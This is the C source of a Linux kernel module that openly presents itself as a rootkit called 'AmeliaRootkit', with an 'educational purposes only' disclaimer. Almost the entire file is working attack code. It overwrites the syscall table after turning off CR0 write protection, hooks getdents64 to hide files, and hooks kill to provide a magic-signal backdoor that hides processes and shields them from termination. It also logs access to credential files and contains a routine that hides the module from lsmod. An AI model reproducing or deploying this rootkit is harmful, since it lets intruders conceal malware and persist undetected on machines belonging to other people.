/*
 * AmeliaRootkit - Advanced Linux Kernel Rootkit
 * Syscall Hooking + DKOM (Direct Kernel Object Manipulation)
 * Author: Amelia Enora Marceline Chavez Barroso
 * WARNING: For educational purposes only!
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

#define ROOTKIT_VERSION "1.0.0"
#define HIDDEN_PREFIX "amelia_"
#define MAGIC_PID 1337

// Original syscall function pointers
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_sys_kill)(const struct pt_regs *);
static asmlinkage long (*orig_sys_open)(const struct pt_regs *);

// System call table manipulation
unsigned long *sys_call_table;
static bool rootkit_hidden = false;

// Process hiding list
struct hidden_proc {
    pid_t pid;
    struct list_head list;
};

static LIST_HEAD(hidden_processes);
static DEFINE_SPINLOCK(hidden_proc_lock);

// Find system call table
unsigned long *find_sys_call_table(void)
{
    unsigned long offset = PAGE_OFFSET;
    unsigned long *sct;

    while (offset < ULLONG_MAX) {
        sct = (unsigned long *)offset;
        
        if (sct[__NR_close] == (unsigned long)ksys_close) {
            pr_info("AmeliaRootkit: Found sys_call_table at %p\n", sct);
            return sct;
        }
        offset += sizeof(void *);
    }
    
    return NULL;
}

// Disable/Enable write protection
static inline void disable_wp(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

static inline void enable_wp(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

// Hide process by PID
void hide_process(pid_t pid)
{
    struct hidden_proc *hp;
    
    hp = kmalloc(sizeof(struct hidden_proc), GFP_KERNEL);
    if (!hp) return;
    
    hp->pid = pid;
    
    spin_lock(&hidden_proc_lock);
    list_add(&hp->list, &hidden_processes);
    spin_unlock(&hidden_proc_lock);
    
    pr_info("AmeliaRootkit: Hidden process PID %d\n", pid);
}

// Check if process is hidden
bool is_process_hidden(pid_t pid)
{
    struct hidden_proc *hp;
    bool found = false;
    
    spin_lock(&hidden_proc_lock);
    list_for_each_entry(hp, &hidden_processes, list) {
        if (hp->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_proc_lock);
    
    return found;
}

// Hooked getdents64 - Hide files and processes
static asmlinkage long hooked_sys_getdents64(const struct pt_regs *regs)
{
    long ret;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    
    ret = orig_sys_getdents64(regs);
    if (ret <= 0) return ret;
    
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (!dirent_ker) return ret;
    
    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        // Hide files with our prefix
        if (strstr(current_dir->d_name, HIDDEN_PREFIX) != NULL) {
            pr_info("AmeliaRootkit: Hiding file %s\n", current_dir->d_name);
            
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    kfree(dirent_ker);
    return ret;
}

// Hooked kill - Backdoor commands
static asmlinkage long hooked_sys_kill(const struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    
    // Magic signal to hide/unhide rootkit
    if (sig == 64) {
        if (pid == MAGIC_PID) {
            if (rootkit_hidden) {
                // Unhide rootkit
                rootkit_hidden = false;
                pr_info("AmeliaRootkit: Rootkit revealed\n");
            } else {
                // Hide rootkit
                rootkit_hidden = true;
                pr_info("AmeliaRootkit: Rootkit hidden\n");
            }
            return 0;
        }
        
        // Hide process
        hide_process(pid);
        return 0;
    }
    
    // Block killing of hidden processes
    if (is_process_hidden(pid)) {
        pr_info("AmeliaRootkit: Blocked kill of hidden process %d\n", pid);
        return -ESRCH;
    }
    
    return orig_sys_kill(regs);
}

// Hooked open - Log file access
static asmlinkage long hooked_sys_open(const struct pt_regs *regs)
{
    char __user *filename = (char __user *)regs->di;
    char *kernel_filename;
    long ret;
    
    kernel_filename = kmalloc(256, GFP_KERNEL);
    if (!kernel_filename) return orig_sys_open(regs);
    
    if (copy_from_user(kernel_filename, filename, 255)) {
        kfree(kernel_filename);
        return orig_sys_open(regs);
    }
    
    kernel_filename[255] = '\0';
    
    // Log sensitive file access
    if (strstr(kernel_filename, "/etc/passwd") ||
        strstr(kernel_filename, "/etc/shadow") ||
        strstr(kernel_filename, "/proc/")) {
        pr_info("AmeliaRootkit: File access logged: %s\n", kernel_filename);
    }
    
    kfree(kernel_filename);
    return orig_sys_open(regs);
}

// Install syscall hooks
static int install_hooks(void)
{
    pr_info("AmeliaRootkit: Installing syscall hooks...\n");
    
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        pr_err("AmeliaRootkit: Could not find sys_call_table\n");
        return -1;
    }
    
    // Save original syscalls
    orig_sys_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_sys_kill = (void *)sys_call_table[__NR_kill];
    orig_sys_open = (void *)sys_call_table[__NR_openat];
    
    // Disable write protection
    disable_wp();
    
    // Install hooks
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_sys_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)hooked_sys_kill;
    sys_call_table[__NR_openat] = (unsigned long)hooked_sys_open;
    
    // Re-enable write protection
    enable_wp();
    
    pr_info("AmeliaRootkit: Syscall hooks installed\n");
    return 0;
}

// Remove syscall hooks
static void remove_hooks(void)
{
    pr_info("AmeliaRootkit: Removing syscall hooks...\n");
    
    if (!sys_call_table) return;
    
    // Disable write protection
    disable_wp();
    
    // Restore original syscalls
    sys_call_table[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)orig_sys_kill;
    sys_call_table[__NR_openat] = (unsigned long)orig_sys_open;
    
    // Re-enable write protection
    enable_wp();
    
    pr_info("AmeliaRootkit: Syscall hooks removed\n");
}

// DKOM: Hide module from module list
static void hide_module(void)
{
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    pr_info("AmeliaRootkit: Module hidden from lsmod\n");
}

// Clean up hidden processes list
static void cleanup_hidden_processes(void)
{
    struct hidden_proc *hp, *tmp;
    
    spin_lock(&hidden_proc_lock);
    list_for_each_entry_safe(hp, tmp, &hidden_processes, list) {
        list_del(&hp->list);
        kfree(hp);
    }
    spin_unlock(&hidden_proc_lock);
}

// Module initialization
static int __init rootkit_init(void)
{
    pr_info("AmeliaRootkit: Loading advanced rootkit v%s\n", ROOTKIT_VERSION);
    
    if (install_hooks() != 0) {
        pr_err("AmeliaRootkit: Failed to install hooks\n");
        return -1;
    }
    
    // Hide the module after 5 seconds
    // hide_module();
    
    pr_info("AmeliaRootkit: Rootkit loaded and active\n");
    pr_info("AmeliaRootkit: Use 'kill -64 1337' to toggle visibility\n");
    pr_info("AmeliaRootkit: Use 'kill -64 <pid>' to hide processes\n");
    
    return 0;
}

// Module cleanup
static void __exit rootkit_exit(void)
{
    pr_info("AmeliaRootkit: Unloading rootkit\n");
    
    remove_hooks();
    cleanup_hidden_processes();
    
    pr_info("AmeliaRootkit: Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_AUTHOR("Amelia Enora Marceline Chavez Barroso");
MODULE_DESCRIPTION("AmeliaRootkit - Advanced Linux Kernel Rootkit");
MODULE_VERSION(ROOTKIT_VERSION);
MODULE_LICENSE("GPL"); 